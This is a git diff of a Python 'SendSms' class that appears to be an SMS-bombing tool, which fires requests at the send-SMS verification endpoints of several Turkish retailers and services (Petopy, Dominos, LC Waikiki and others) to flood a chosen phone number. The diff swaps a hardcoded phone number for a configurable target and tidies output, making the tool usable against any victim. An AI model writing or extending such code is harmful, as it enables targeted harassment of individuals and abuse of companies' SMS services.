@@ -16,18 +16,12 @@ class SendSms():
         else:
             self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"
 
-
-
-
-
-
     #service.petopy.com by ever0ne
     def Petopy(self):
         try:
             site = requests.post("https://service.petopy.com/api/auth/send-sms", 
                                    headers={"User-Agent":"okhttp/5.0.0-alpha.10","locale":"tr"},  
-                                   json={"country_code": "+90","phone": "5523621482","opt_sms": false,"security_code": "B74FDDEC18B11B4E8E428FB48AB6D"})
-            print(site.json())
+                                   json={"country_code": "+90","phone": self.phone,"opt_sms": false,"security_code": "B74FDDEC18B11B4E8E428FB48AB6D"})
             if site.status_code == 200:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Petopy by ever0ne")
                 self.adet += 1
@@ -111,8 +105,6 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Dominos by ever0ne")
 
-            
-
 
             
     #mobileapi-redesign.boyner.com.tr by ever0ne
@@ -143,8 +135,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> LC Waikiki by ever0ne")
-
-        
         
      
     #wmf.com.tr
